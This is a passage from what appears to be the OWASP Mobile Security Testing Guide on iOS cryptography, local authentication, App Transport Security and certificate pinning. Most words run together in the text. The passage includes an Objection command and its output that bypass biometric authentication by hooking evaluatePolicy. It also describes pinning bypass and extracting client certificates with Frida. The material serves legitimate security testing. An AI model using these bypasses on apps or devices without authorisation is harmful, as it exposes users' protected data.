Ensurethatthebestpracticesoutlinedinthe“CryptographyforMobileApps”chapterarefollowed. Lookatinsecureand deprecatedalgorithmsandcommonconfigurationissues. CommonCryptor IftheappusesstandardcryptographicimplementationsprovidedbyApple, theeasiestwaytodeterminethestatusof therelatedalgorithmistocheckforcallstofunctionsfromCommonCryptor,suchasCCCryptandCCCryptorCreate. The sourcecodecontainsthesignaturesofallfunctionsofCommonCryptor.h. Forinstance,CCCryptorCreatehasfollowing signature: CCCryptorStatusCCCryptorCreate( CCOperationop, /*kCCEncrypt,etc.*/ CCAlgorithmalg, /*kCCAlgorithmDES,etc.*/ CCOptionsoptions, /*kCCOptionPKCS7Padding,etc.*/ const void *key, /*rawkeymaterial*/ size_t keyLength, const void *iv, /*optionalinitializationvector*/ CCCryptorRef *cryptorRef); /*RETURNED*/ Youcanthencomparealltheenumtypestodeterminewhichalgorithm,padding,andkeymaterialisused. Payattention tothekeyingmaterial: thekeyshouldbegeneratedsecurely-eitherusingakeyderivationfunctionorarandom-number generationfunction. Notethatfunctionswhicharenotedinchapter“CryptographyforMobileApps”asdeprecated,are stillprogrammaticallysupported. Theyshouldnotbeused. 419\nThird party libraries Giventhecontinuousevolutionofallthirdpartylibraries,thisshouldnotbetheplacetoevaluateeachlibraryintermsof staticanalysis. Stilltherearesomepointsofattention: • Findthelibrarybeingused: Thiscanbedoneusingthefollowingmethods: – CheckthecartfileifCarthageisused. – CheckthepodfileifCocoapodsisused. – Checkthelinkedlibraries: Openthexcodeprojfileandchecktheprojectproperties. GototheBuildPhases tabandchecktheentriesinLinkBinaryWithLibrariesforanyofthelibraries. Seeearliersectionsonhow toobtainsimilarinformationusingMobSF. – Inthecaseofcopy-pastedsources: searchtheheaderfiles(incaseofusingObjective-C)andotherwisethe Swiftfilesforknownmethodnamesforknownlibraries. • Determinetheversionbeingused: Alwayschecktheversionofthelibrarybeingusedandcheckwhetherthere is a new version available in which possible vulnerabilities or shortcomings are patched. Even without a newer version of a library, it can be the case that cryptographic functions have not been reviewed yet. Therefore we always recommend using a library that has been validated or ensure that you have the ability, knowledge and experiencetodovalidationyourself. • Byhand?: Werecommendnottorollyourowncrypto,nortoimplementknowncryptographicfunctionsyourself. Testing Key Management Platform: ios MASVSV1: MSTG-CRYPTO-1,MSTG-CRYPTO-5 MASVSV2: MASVS-CRYPTO-2 Overview Static Analysis Therearevariouskeywordstolookfor: checkthelibrariesmentionedintheoverviewandstaticanalysisofthesection “VerifyingtheConfigurationofCryptographicStandardAlgorithms”forwhichkeywordsyoucanbestcheckonhowkeys arestored. Alwaysmakesurethat: • keysarenotsynchronizedoverdevicesifitisusedtoprotecthigh-riskdata. • keysarenotstoredwithoutadditionalprotection. • keysarenothardcoded. • keysarenotderivedfromstablefeaturesofthedevice. • keysarenothiddenbyuseoflowerlevellanguages(e.g.C/C++). • keysarenotimportedfromunsafelocations. Checkalsothelistofcommoncryptographicconfigurationissues. Mostoftherecommendationsforstaticanalysiscanalreadybefoundinchapter“TestingDataStorageforiOS”.Next,you canreaduponitatthefollowingpages: • AppleDeveloperDocumentation: Certificatesandkeys • AppleDeveloperDocumentation: Generatingnewkeys • AppleDeveloperDocumentation: Keygenerationattributes Dynamic Analysis Hookcryptographicmethodsandanalyzethekeysthatarebeingused. Monitorfilesystemaccesswhilecryptographic operationsarebeingperformedtoassesswherekeymaterialiswrittentoorreadfrom. 420\nTesting Random Number Generation Platform: ios MASVSV1: MSTG-CRYPTO-6 MASVSV2: MASVS-CRYPTO-1 Overview Static Analysis InSwift,theSecRandomCopyBytesAPIisdefinedasfollows: funcSecRandomCopyBytes(_rnd:SecRandomRef?, _count:Int, _bytes:UnsafeMutablePointer<UInt8>)->Int32 TheObjective-Cversionis intSecRandomCopyBytes(SecRandomRefrnd,size_tcount,uint8_t *bytes); ThefollowingisanexampleoftheAPIsusage: intresult =SecRandomCopyBytes(kSecRandomDefault,16,randomBytes); Note: ifothermechanismsareusedforrandomnumbersinthecode, verifythattheseareeitherwrappersaroundthe APIsmentionedaboveorreviewthemfortheirsecure-randomness. Oftenthisistoohard,whichmeansyoucanbeststick withtheimplementationabove. Dynamic Analysis Ifyouwanttotestforrandomness,youcantrytocapturealargesetofnumbersandcheckwithBurp’ssequencerplugin toseehowgoodthequalityoftherandomnessis. 421\niOS Local Authentication Overview During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user “unlocks” the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that userscanmoreconvenientlyresumeanexistingsessionwitharemoteserviceorasameansofstep-upauthentication toprotectsomecriticalfunction. Asstatedbeforeinchapter“MobileAppAuthenticationArchitectures”: Thetestershouldbeawarethatlocalauthentica- tionshouldalwaysbeenforcedataremoteendpointorbasedonacryptographicprimitive. Attackerscaneasilybypass localauthenticationifnodatareturnsfromtheauthenticationprocess. A variety of methods are available for integrating local authentication into apps. The Local Authentication framework provides a set of APIs for developers to extend an authentication dialog to a user. In the context of connecting to a remoteservice,itispossible(andrecommended)toleveragethekeychainforimplementinglocalauthentication. FingerprintauthenticationoniOSisknownasTouchID.ThefingerprintIDsensorisoperatedbytheSecureEnclavesecurity coprocessoranddoesnotexposefingerprintdatatoanyotherpartsofthesystem. NexttoTouchID,Appleintroduced FaceID:whichallowsauthenticationbasedonfacialrecognition. BothusesimilarAPIsonanapplicationlevel,theactual methodofstoringthedataandretrievingthedata(e.g.facialdataorfingerprintrelateddataisdifferent). DevelopershavetwooptionsforincorporatingTouchID/FaceIDauthentication: • LocalAuthentication.frameworkisahigh-levelAPIthatcanbeusedtoauthenticatetheuserviaTouchID.The appcan’taccessanydataassociatedwiththeenrolledfingerprintandisnotifiedonlywhetherauthenticationwas successful. • Security.frameworkisalowerlevelAPItoaccesskeychainservices. Thisisasecureoptionifyourappneedsto protect some secret data with biometric authentication, since the access control is managed on a system-level and can not easily be bypassed. Security.framework has a C API, but there are several open source wrap- pers available, making access to the keychain as simple as to NSUserDefaults. Security.framework underlies LocalAuthentication.framework;Applerecommendstodefaulttohigher-levelAPIswheneverpossible. Please be aware that using either the LocalAuthentication.framework or the Security.framework, will be a control thatcanbebypassedbyanattackerasitdoesonlyreturnabooleanandnodatatoproceedwith. SeeDon’ttouchme thatway,byDavidLindneretalformoredetails. Local Authentication Framework TheLocalAuthenticationframeworkprovidesfacilitiesforrequestingapassphraseorTouchIDauthenticationfromusers. DeveloperscandisplayandutilizeanauthenticationpromptbyutilizingthefunctionevaluatePolicyoftheLAContext class. Twoavailablepoliciesdefineacceptableformsofauthentication: • deviceOwnerAuthentication(Swift)or LAPolicyDeviceOwnerAuthentication(Objective-C):Whenavailable, the userispromptedtoperformTouchIDauthentication. IfTouchIDisnotactivated,thedevicepasscodeisrequested instead. Ifthedevicepasscodeisnotenabled,policyevaluationfails. • deviceOwnerAuthenticationWithBiometrics (Swift) or LAPolicyDeviceOwnerAuthenticationWithBiomet- rics(Objective-C):AuthenticationisrestrictedtobiometricswheretheuserispromptedforTouchID. TheevaluatePolicyfunctionreturnsabooleanvalueindicatingwhethertheuserhasauthenticatedsuccessfully. TheAppleDeveloperwebsiteofferscodesamplesforbothSwiftandObjective-C.AtypicalimplementationinSwiftlooks asfollows. letcontext =LAContext() varerror:NSError? guard context.canEvaluatePolicy(.deviceOwnerAuthentication,error:&error)else { //Couldnotevaluatepolicy;lookaterrorandpresentanappropriatemessagetouser 422\n} context.evaluatePolicy(.deviceOwnerAuthentication,localizedReason:"Please,passauthorizationtoenterthisarea"){success,evaluationError in guard success else { //Userdidnotauthenticatesuccessfully,lookatevaluationErrorandtakeappropriateaction } //Userauthenticatedsuccessfully,takeappropriateaction } Using Keychain Services for Local Authentication TheiOSkeychainAPIscan(andshould)beusedtoimplementlocalauthentication. Duringthisprocess,theappstores either a secret authentication token or another piece of secret data identifying the user in the keychain. In order to authenticatetoaremoteservice,theusermustunlockthekeychainusingtheirpassphraseorfingerprinttoobtainthe secretdata. ThekeychainallowssavingitemswiththespecialSecAccessControlattribute,whichwillallowaccesstotheitemfrom thekeychainonlyaftertheuserhaspassedTouchIDauthentication(orpasscode,ifsuchafallbackisallowedbyattribute parameters). In the following example we will save the string “test_strong_password” to the keychain. The string can be ac- cessed only on the current device while the passcode is set (kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly parameter) and after Touch ID authentication for the currently enrolled fingers only (SecAccessControlCreateFlags. biometryCurrentSetparameter): Swift //1.CreatetheAccessControlobjectthatwillrepresentauthenticationsettings varerror:Unmanaged<CFError>? guard letaccessControl =SecAccessControlCreateWithFlags(kCFAllocatorDefault, kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly, SecAccessControlCreateFlags.biometryCurrentSet, &error)else { //failedtocreateAccessControlobject return } //2.Createthekeychainservicesquery.PayattentionthatkSecAttrAccessControlismutuallyexclusivewithkSecAttrAccessibleattribute varquery:[String:Any]=[:] query[kSecClass asString]=kSecClassGenericPassword query[kSecAttrLabel asString]="com.me.myapp.password" asCFString query[kSecAttrAccount asString]="OWASPAccount" asCFString query[kSecValueData asString]="test_strong_password".data(using:.utf8)!as CFData query[kSecAttrAccessControl asString]=accessControl //3.Savetheitem letstatus =SecItemAdd(query asCFDictionary,nil) ifstatus ==noErr { //successfullysaved }else { //errorwhilesaving } //4.Nowwecanrequestthesaveditemfromthekeychain.Keychainserviceswillpresenttheauthenticationdialogto theuserandreturndataornildepending ↪ onwhetherasuitablefingerprintwasprovidedornot. //5.Createthequery varquery =[String:Any]() query[kSecClass asString]=kSecClassGenericPassword query[kSecReturnData asString]=kCFBooleanTrue query[kSecAttrAccount asString]="MyName" asCFString query[kSecAttrLabel asString]="com.me.myapp.password" asCFString query[kSecUseOperationPrompt asString]="Please,passauthorisationtoenterthisarea" asCFString //6.Gettheitem varqueryResult:AnyObject? letstatus =withUnsafeMutablePointer(to:&queryResult){ SecItemCopyMatching(query asCFDictionary,UnsafeMutablePointer($0)) } 423\nifstatus ==noErr { letpassword =String(data:queryResult as!Data,encoding:.utf8)! //successfullyreceivedpassword }else { //authorizationnotpassed } Objective-C //1.CreatetheAccessControlobjectthatwillrepresentauthenticationsettings CFErrorRef *err=nil; SecAccessControlRefsacRef =SecAccessControlCreateWithFlags(kCFAllocatorDefault, kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly, kSecAccessControlUserPresence, err); //2.Createthekeychainservicesquery.PayattentionthatkSecAttrAccessControlismutuallyexclusivewithkSecAttrAccessibleattribute NSDictionary*query =@{ (__bridgeid)kSecClass:(__bridgeid)kSecClassGenericPassword, (__bridgeid)kSecAttrLabel:@"com.me.myapp.password", (__bridgeid)kSecAttrAccount:@"OWASPAccount", (__bridgeid)kSecValueData:[@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding], (__bridgeid)kSecAttrAccessControl:(__bridge_transferid)sacRef }; //3.Savetheitem OSStatusstatus =SecItemAdd((__bridgeCFDictionaryRef)query,nil); if(status ==noErr){ //successfullysaved }else { //errorwhilesaving } //4.Nowwecanrequestthesaveditemfromthekeychain.Keychainserviceswillpresenttheauthenticationdialogto theuserandreturndataornildepending ↪ onwhetherasuitablefingerprintwasprovidedornot. //5.Createthequery NSDictionary *query =@{(__bridgeid)kSecClass:(__bridgeid)kSecClassGenericPassword, (__bridgeid)kSecReturnData:@YES, (__bridgeid)kSecAttrAccount:@"MyName1", (__bridgeid)kSecAttrLabel:@"com.me.myapp.password", (__bridgeid)kSecUseOperationPrompt:@"Please,passauthorisationtoenterthisarea" }; //6.Gettheitem CFTypeRefqueryResult =NULL; OSStatusstatus =SecItemCopyMatching((__bridgeCFDictionaryRef)query,&queryResult); if(status ==noErr){ NSData*resultData =(__bridge_transferNSData*)queryResult; NSString*password =[[NSStringalloc]initWithData:resultDataencoding:NSUTF8StringEncoding]; NSLog(@"%@",password); }else { NSLog(@"Somethingwentwrong"); } Note regarding temporariness of keys in the Keychain UnlikemacOSandAndroid,iOSdoesnotsupporttemporarinessofanitem’saccessibilityinthekeychain: whenthereis noadditionalsecuritycheckwhenenteringthekeychain(e.g.kSecAccessControlUserPresenceorsimilarisset),then oncethedeviceisunlocked,akeywillbeaccessible. Testing Local Authentication Platform: ios MASVSV1: MSTG-AUTH-8,MSTG-STORAGE-11 MASVSV2: MASVS-AUTH-2 424\nOverview Theusageofframeworksinanappcanbedetectedbyanalyzingtheappbinary’slistofshareddynamiclibraries. This canbedonebyusingotool: otool -L<AppName>.app/<AppName> IfLocalAuthentication.frameworkisusedinanapp,theoutputwillcontainbothofthefollowinglines(rememberthat LocalAuthentication.frameworkusesSecurity.frameworkunderthehood): /System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication /System/Library/Frameworks/Security.framework/Security IfSecurity.frameworkisused,onlythesecondonewillbeshown. Static Analysis It is important to remember that the LocalAuthentication framework is an event-based procedure and as such, should not be the sole method of authentication. Though this type of authentication is effective on the user-interface level, it iseasilybypassedthroughpatchingorinstrumentation. Therefore,itisbesttousethekeychainservicemethod,which meansyoushould: • Verifythatsensitiveprocesses,suchasre-authenticatingauserperformingapaymenttransaction,areprotected usingthekeychainservicesmethod. • Verifythataccesscontrolflagsaresetforthekeychainitemwhichensurethatthedataofthekeychainitemcan onlybeunlockedbymeansofauthenticatingtheuser. Thiscanbedonewithoneofthefollowingflags: – kSecAccessControlBiometryCurrentSet (before iOS 11.3 kSecAccessControlTouchIDCurrentSet). This willmakesurethatauserneedstoauthenticatewithbiometrics(e.g.FaceIDorTouchID)beforeaccessing thedatainthekeychainitem. Whenevertheuseraddsafingerprintorfacialrepresentationtothedevice,it willautomaticallyinvalidatetheentryintheKeychain. Thismakessurethatthekeychainitemcanonlyever beunlockedbyusersthatwereenrolledwhentheitemwasaddedtothekeychain. – kSecAccessControlBiometryAny(beforeiOS11.3kSecAccessControlTouchIDAny). Thiswillmakesurethat a user needs to authenticate with biometrics (e.g. Face ID or Touch ID) before accessing the data in the Keychainentry. TheKeychainentrywillsurviveany(re-)enrolingofnewfingerprintsorfacialrepresentation. Thiscanbeveryconvenientiftheuserhasachangingfingerprint. However,italsomeansthatattackers,who aresomehowabletoenroletheirfingerprintsorfacialrepresentationstothedevice, cannowaccessthose entriesaswell. – kSecAccessControlUserPresence can be used as an alternative. This will allow the user to authenticate through a passcode if the biometric authentication no longer works. This is considered to be weaker than kSecAccessControlBiometryAny since it is much easier to steal someone’s passcode entry by means of shouldersurfing,thanitistobypasstheTouchIDorFaceIDservice. • Inordertomakesurethatbiometricscanbeused,verifythatthekSecAttrAccessibleWhenPasscodeSetThisDe- viceOnlyorthekSecAttrAccessibleWhenPasscodeSetprotectionclassissetwhentheSecAccessControlCre- ateWithFlagsmethodiscalled. Notethatthe...ThisDeviceOnlyvariantwillmakesurethatthekeychainitem isnotsynchronizedwithotheriOSdevices. Note,adataprotectionclassspecifiestheaccessmethodologyusedtosecurethedata. Eachclassusesdifferent policiestodeterminewhenthedataisaccessible. Dynamic Analysis Objection Biometrics Bypass can be used to bypass LocalAuthentication. Objection uses Frida to instrument theeval- uatePolicy function so that it returns True even if authentication was not successfully performed. Use the ios ui biometrics_bypasscommandtobypasstheinsecurebiometricauthentication. Objectionwillregisterajob,whichwill replacetheevaluatePolicyresult. Itwillworkinboth,SwiftandObjective-Cimplementations. 425\n...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #iosuibiometrics_bypass (agent)Registeringjob3mhtws9x47q.Type:ios-biometrics-disable ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #(agent)[3mhtws9x47q]LocalizedReasonforauthrequirement:Pleaseauthenticateyourself (agent)[3mhtws9x47q]OSauthenticationresponse:false (agent)[3mhtws9x47q]MarkingOSresponseasTrueinstead (agent)[3mhtws9x47q]Biometricsbypasshookcomplete Ifvulnerable,themodulewillautomaticallybypasstheloginform. 426\niOS Network Communication Overview AlmosteveryiOSappactsasaclienttooneormoreremoteservices. Asthisnetworkcommunicationusuallytakesplace overuntrustednetworkssuchaspublicWi-Fi,classicalnetworkbased-attacksbecomeapotentialissue. Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and sup- ported. iOS App Transport Security Starting with iOS 9, Apple introduced App Transport Security (ATS) which is a set of security checks enforced by the operatingsystemforconnectionsmadeusingtheURLLoadingSystem(typicallyviaURLSession)toalwaysuseHTTPS. AppsshouldfollowApple’sbestpracticestoproperlysecuretheirconnections. WatchATSIntroductoryVideofromtheAppleWWDC2015. ATSperformsdefaultservertrustevaluationandrequiresaminimumsetofsecurityrequirements. DefaultServerTrustEvaluation: When an app connects to a remote server, the server provides its identity using an X.509 digital certificate. The ATS defaultservertrustevaluationincludesvalidatingthatthecertificate: • Isn’texpired. • Hasanamethatmatchestheserver’sDNSname. • Has a digital signature that is valid (hasn’t been tampered with) and can be traced back to a trusted Certificate Authority(CA)includedintheoperatingsystemTrustStore, orbeinstalledontheclientbytheuserorasystem administrator. MinimumSecurityRequirementsforConnections: ATSwillblockconnectionsthatfurtherfailtomeetasetofminimumsecurityrequirementsincluding: • TLSversion1.2orgreater. • DataencryptionwithAES-128orAES-256. • ThecertificatemustbesignedwithanRSAkey(2048bitsorgreater),oranECCkey(256bitsorgreater). • Thecertificate’sfingerprintmustuseSHA-256orgreater. • Thelinkmustsupportperfectforwardsecrecy(PFS)throughEllipticCurveDiffie-HellmanEphemeral(ECDHE)key exchange. Certificatevaliditychecking: AccordingtoApple,“evaluatingthetrustedstatusofaTLScertificateisperformedinaccordancewithestablishedindustry standards,assetoutinRFC5280,andincorporatesemergingstandardssuchasRFC6962(CertificateTransparency). In iOS 11 or later, Apple devices are periodically updated with a current list of revoked and constrained certificates. The list is aggregated from certificate revocation lists (CRLs), which are published by each of the built-in root certificate authorities trusted by Apple, as well as by their subordinate CA issuers. The list may also include other constraints at Apple’sdiscretion. ThisinformationisconsultedwheneveranetworkAPIfunctionisusedtomakeasecureconnection. If there are too many revoked certificates from a CA to list individually, a trust evaluation may instead require that an onlinecertificatestatusresponse(OCSP)isneeded,andiftheresponseisn’tavailable,thetrustevaluationwillfail.” When does ATS not apply? • Whenusinglower-levelAPIs: ATSonlyappliestotheURLLoadingSystemincludingURLSessionandAPIslayered ontopofthem. Itdoesnotapplytoappsthatuselower-levelAPIs(likeBSDSockets),includingthosethatimplement TLSontopofthoselower-levelAPIs(seesection“UsingATSinAppleFrameworks”fromtheArchivedAppleDeveloper Documentation). 427\n• When connecting to IP addresses, unqualified domain names or local hosts: ATSappliesonlytoconnec- tions made to public host names (see section “Availability of ATS for Remote and Local Connections” from the ArchivedAppleDeveloperDocumentation). ThesystemdoesnotprovideATSprotectiontoconnectionsmadeto: – Internetprotocol(IP)addresses – Unqualifiedhostnames – Localhostsemployingthe.localtop-leveldomain(TLD) • When including ATS Exceptions: If the app uses the ATS compatible APIs, it can still disable ATS for specific scenariosusingATSExceptions. Learnmore: • “ATSandiOSenterpriseappswithprivatenetworks” • “ATSandlocalIPaddresses” • “ATSimpactonappsuse3rdpartylibraries” • “ATSandSSLpinning/ownCA” ATS Exceptions ATS restrictions can be disabled by configuring exceptions in the Info.plist file under the NSAppTransportSecurity key. Theseexceptionscanbeappliedto: • allowinsecureconnections(HTTP), • lowertheminimumTLSversion, • disablePerfectForwardSecrecy(PFS)or • allowconnectionstolocaldomains. ATS exceptions can be applied globally or per domain basis. The application can globally disable ATS, but opt in for individualdomains. ThefollowinglistingfromAppleDeveloperdocumentationshowsthestructureoftheNSAppTrans- portSecuritydictionary. NSAppTransportSecurity :Dictionary { NSAllowsArbitraryLoads :Boolean NSAllowsArbitraryLoadsForMedia :Boolean NSAllowsArbitraryLoadsInWebContent :Boolean NSAllowsLocalNetworking :Boolean NSExceptionDomains :Dictionary { <domain-name-string>:Dictionary { NSIncludesSubdomains :Boolean NSExceptionAllowsInsecureHTTPLoads :Boolean NSExceptionMinimumTLSVersion :String NSExceptionRequiresForwardSecrecy :Boolean //DefaultvalueisYES NSRequiresCertificateTransparency :Boolean } } } Source: AppleDeveloperDocumentation. ThefollowingtablesummarizestheglobalATSexceptions. Formoreinformationabouttheseexceptions,pleasereferto table2intheofficialAppledeveloperdocumentation. Key Description NSAllowsArbitraryLoads DisableATSrestrictionsgloballyexceptsforindividual domainsspecifiedunderNSExceptionDomains NSAllowsArbitraryLoadsInWebContent DisableATSrestrictionsforalltheconnectionsmade fromwebviews NSAllowsLocalNetworking Allowconnectiontounqualifieddomainnamesand .localdomains NSAllowsArbitraryLoadsForMedia DisableallATSrestrictionsformedialoadedthrough theAVFoundationsframework 428\nThe following table summarizes the per-domain ATS exceptions. For more information about these exceptions, please refertotable3intheofficialAppledeveloperdocumentation. Key Description NSIncludesSubdomains IndicateswhetherATSexceptionsshouldapplyto subdomainsofthenameddomain NSExceptionAllowsInsecureHTTPLoads AllowsHTTPconnectionstothenameddomain,but doesnotaffectTLSrequirements NSExceptionMinimumTLSVersion AllowsconnectionstoserverswithTLSversionsless than1.2 NSExceptionRequiresForwardSecrecy Disableperfectforwardsecrecy(PFS) JustifyingExceptions: Starting from January 1 2017, Apple App Store review requires justification if one of the following ATS exceptions are defined. • NSAllowsArbitraryLoads • NSAllowsArbitraryLoadsForMedia • NSAllowsArbitraryLoadsInWebContent • NSExceptionAllowsInsecureHTTPLoads • NSExceptionMinimumTLSVersion Thismustbecarefullyrevisedtodetermineifit’sindeedpartoftheappintendedpurpose. Applewarnsaboutexceptions reducing the security of the apps and advises to configure exceptions only when needed and prefer to server fixeswhenfacedwithanATSfailure. Example: Inthefollowingexample,ATSisgloballyenabled(there’snoglobalNSAllowsArbitraryLoadsdefined)butanexceptionis explicitlysetfortheexample.comdomain(anditssubdomains). Consideringthatthedomainisownedbytheapplication developersandthere’saproperjustificationthisexceptionwouldbeacceptable,sinceitmaintainsallthebenefitsofATS forallotherdomains. However,itwouldbealwayspreferabletofixtheserverasindicatedabove. <key>NSAppTransportSecurity</key> <dict> <key>NSExceptionDomains</key> <dict> <key>example.com</key> <dict> <key>NSIncludesSubdomains</key> <true/> <key>NSExceptionMinimumTLSVersion</key> <string>TLSv1.2</string> <key>NSExceptionAllowsInsecureHTTPLoads</key> <true/> <key>NSExceptionRequiresForwardSecrecy</key> <true/> </dict> </dict> </dict> FormoreinformationonATSexceptionspleaseconsultsection“ConfigureExceptionsOnlyWhenNeeded;PreferServer Fixes”fromthearticle“PreventingInsecureNetworkConnections”intheAppleDeveloperDocumentationandtheblog postonATS. Server Trust Evaluation ATSimposesextendedsecuritychecksthatsupplementthedefaultservertrustevaluationprescribedbytheTransport LayerSecurity(TLS)protocol. LooseningATSrestrictionsreducesthesecurityoftheapp. Appsshouldpreferalternative waystoimproveserversecuritybeforeaddingATSexceptions. TheAppleDeveloperDocumentationexplainsthatanappcanuseURLSessiontoautomaticallyhandleservertrusteval- uation. However,appsarealsoabletocustomizethatprocess,forexampletheycan: 429\n• bypassorcustomizecertificateexpiry. • loosen/extendtrust: acceptservercredentialsthatwouldotherwiseberejectedbythesystem,e.g.tomakesecure connectionstoadevelopmentserverusingself-signedcertificatesembeddedintheapp. • tightentrust: rejectcredentialsthatwouldotherwisebeacceptedbythesystem. • etc. References: • PreventingInsecureNetworkConnections • PerformingManualServerTrustAuthentication • Certificate,Key,andTrustServices iOS Network APIs Since iOS 12.0 the Network framework and the URLSession class provide methods to load network and URL requests asynchronouslyandsynchronously. OlderiOSversionscanutilizetheSocketsAPI. Network Framework The Network framework was introduced at The Apple Worldwide Developers Conference (WWDC) in 2018 and is a re- placementtotheSocketsAPI.Thislow-levelnetworkingframeworkprovidesclassestosendandreceivedatawithbuilt indynamicnetworking,securityandperformancesupport. TLS1.3isenabledbydefaultintheNetworkframework,iftheargumentusing: .tlsisused. Itisthepreferredoption overthelegacySecureTransportframework. URLSession URLSessionwasbuiltupontheNetworkframeworkandutilizesthesametransportservices. TheclassalsousesTLS1.3 bydefault,iftheendpointisHTTPS. URLSession should be used for HTTP and HTTPS connections, instead of utilizing the Network framework directly. TheURLSessionclassnativelysupportsbothURLschemesandisoptimizedforsuchconnections. Itrequiresless boilerplatecode,reducingthepossibilityforerrorsandensuringsecureconnectionsbydefault. TheNetworkframework shouldonlybeusedwhentherearelow-leveland/oradvancednetworkingrequirements. TheofficialAppledocumentationincludesexamplesofusingtheNetworkframeworktoimplementnetcatandURLSession tofetchwebsitedataintomemory. Testing the TLS Settings Platform: ios MASVSV1: MSTG-NETWORK-2 MASVSV2: MASVS-NETWORK-1 430\nOverview Remembertoinspectthecorrespondingjustificationstodiscardthatitmightbepartoftheappintendedpurpose. ItispossibletoverifywhichATSsettingscanbeusedwhencommunicatingtoacertainendpoint. OnmacOSthecommand line utility nscurl can be used. A permutation of different settings will be executed and verified against the specified endpoint. If the default ATS secure connection test is passing, ATS can be used in its default secure configuration. If thereareanyfailsinthenscurloutput,pleasechangetheserversideconfigurationofTLStomaketheserversidemore secure,ratherthanweakeningtheconfigurationinATSontheclient. Seethearticle“IdentifyingtheSourceofBlocked Connections”intheAppleDeveloperDocumentationformoredetails. Refertosection“VerifyingtheTLSSettings”inchapterTestingNetworkCommunicationfordetails. Testing Custom Certificate Stores and Certificate Pinning Platform: ios MASVSV1: MSTG-NETWORK-4 MASVSV2: MASVS-NETWORK-2 Overview Static Analysis Verifythattheservercertificateispinned. Pinningcanbeimplementedonvariouslevelsintermsofthecertificatetree presentedbytheserver: 1. Includingserver’scertificateintheapplicationbundleandperformingverificationoneachconnection. Thisrequires anupdatemechanismswheneverthecertificateontheserverisupdated. 2. Limitingcertificateissuertoe.g.oneentityandbundlingtheintermediateCA’spublickeyintotheapplication. In thiswaywelimittheattacksurfaceandhaveavalidcertificate. 3. OwningandmanagingyourownPKI.TheapplicationwouldcontaintheintermediateCA’spublickey. Thisavoids updatingtheapplicationeverytimeyouchangethecertificateontheserver,duetoe.g.expiration. Notethatusing yourownCAwouldcausethecertificatetobeself-singed. ThelatestapproachrecommendedbyAppleistospecifyapinnedCApublickeyintheInfo.plistfileunderAppTransport SecuritySettings. YoucanfindanexampleintheirarticleIdentityPinning: Howtoconfigureservercertificatesforyour app. Another common approach is to use the connection:willSendRequestForAuthenticationChallenge: method of NSURLConnectionDelegatetocheckifthecertificateprovidedbytheserverisvalidandmatchesthecertificatestored intheapp. YoucanfindmoredetailsintheHTTPSServerTrustEvaluationtechnicalnote. Thefollowingthird-partylibrariesincludepinningfunctionality: • TrustKit: hereyoucanpinbysettingthepublickeyhashesinyourInfo.plistorprovidethehashesinadictionary. SeetheirREADMEformoredetails. • AlamoFire: hereyoucandefineaServerTrustPolicyperdomainforwhichyoucandefineaPinnedCertificat- esTrustEvaluator. Seeitsdocumentationformoredetails. • AFNetworking: hereyoucansetanAFSecurityPolicytoconfigureyourpinning. Dynamic Analysis Server certificate pinning FollowtheinstructionsfromtheDynamicAnalysissectionof“TestingEndpointIdentityVerification. Ifdoingsodoesn’t leadtotrafficbeingproxied,itmaymeanthatcertificatepinningisactuallyimplementedandallsecuritymeasuresare inplace. Doesthesamehappenforalldomains? 431\nAs a quick smoke test, you can try to bypass certificate pinning using objection as described in “Bypassing Certificate Pinning”. PinningrelatedAPIsbeinghookedbyobjectionshouldappearinobjection’soutput. However,keepinmindthat: • theAPIsmightnotbecomplete. • ifnothingishooked,thatdoesn’tnecessarilymeanthattheappdoesn’timplementpinning. Inbothcases,theapporsomeofitscomponentsmightimplementcustompinninginawaythatissupportedbyobjection. Pleasecheckthestaticanalysissectionforspecificpinningindicatorsandmorein-depthtesting. Client certificate validation Someapplications usemTLS (mutual TLS),meaning that theapplication verifiesthe server’s certificateand the server verifies the client’s certificate. You can notice this if there is an error in Burp Alerts tab indicating that client failed to negotiateconnection. Thereareacoupleofthingsworthnoting: 1. Theclientcertificatecontainsaprivatekeythatwillbeusedforthekeyexchange. 2. Usuallythecertificatewouldalsoneedapasswordtouse(decrypt)it. 3. Thecertificatecanbestoredinthebinaryitself,datadirectoryorintheKeychain. The most common and improper way of using mTLS is to store the client certificate within the application bundle and hardcodethepassword. Thisobviouslydoesnotbringmuchsecurity,becauseallclientswillsharethesamecertificate. Second way of storing the certificate (and possibly password) is to use the Keychain. Upon first login, the application shoulddownloadthepersonalcertificateandstoreitsecurelyintheKeychain. Sometimesapplicationshaveonecertificatethatishardcodedanduseitforthefirstloginandthenthepersonalcertificate isdownloaded. Inthiscase,checkifit’spossibletostillusethe‘generic’certificatetoconnecttotheserver. Onceyouhaveextractedthecertificatefromtheapplication(e.g.usingFrida),additasclientcertificateinBurp,andyou willbeabletointerceptthetraffic. Testing Endpoint Identity Verification Platform: ios MASVSV1: MSTG-NETWORK-3 MASVSV2: MASVS-NETWORK-1 432\nOverview Static Analysis UsingTLStotransportsensitiveinformationoverthenetworkisessentialforsecurity. However,encryptingcommunication betweenamobileapplicationanditsbackendAPIisnottrivial. Developersoftendecideonsimplerbutlesssecuresolutions (e.g.,thosethatacceptanycertificate)tofacilitatethedevelopmentprocess,andsometimestheseweaksolutionsmake itintotheproductionversion,potentiallyexposinguserstoman-in-the-middleattacks. Thesearesomeoftheissuesshouldbeaddressed: • CheckiftheapplinksagainstanSDKolderthaniOS9.0. InthatcaseATSisdisablednomatterwhichversionof theOStheapprunson. • Verifythatacertificatecomesfromatrustedsource,i.e.atrustedCA(CertificateAuthority). • Determinewhethertheendpointserverpresentstherightcertificate. Makesurethatthehostnameandthecertificateitselfareverifiedcorrectly. Examplesandcommonpitfallsareavailable intheofficialAppledocumentation. Wehighlyrecommendsupportingstaticanalysiswiththedynamicanalysis. Ifyoudon’thavethesourcecodeortheapp isdifficulttoreverseengineer,havingasoliddynamicanalysisstrategycandefinitelyhelp. Inthatcaseyouwon’tknowif 